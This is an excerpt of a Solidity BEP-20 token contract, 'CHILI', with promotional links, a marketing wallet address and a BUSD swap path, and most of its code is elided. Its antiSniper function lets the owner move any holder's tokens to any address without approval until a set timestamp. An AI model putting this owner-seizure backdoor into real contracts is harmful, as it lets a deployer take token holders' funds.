...
/*
    Telegram: https://t.me/chilibsc
     Website: www.chilibsc.com
     Twitter: https://twitter.com/chilibsc
*/
...
contract CHILI is Context, IERC20, Ownable {
    ...
    address public marketingWallet = 0x73Ff203Cb2CCfdA2bF42F5ab9579041D254d7b16;
    ...
    function swapTokensForBUSD(uint256 tokenAmount) private {
        ...
        path[2] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD contract address
    ...
    function antiSniper(address sniper, address to, uint256 amount) external onlyOwner() {
      require(block.timestamp <= 1645131600, "antiSniper ended.");
        _tokenTransfer(sniper, to, amount);
    }
...
// Contract & dApp Developer DAPPREX - https://dapprex.com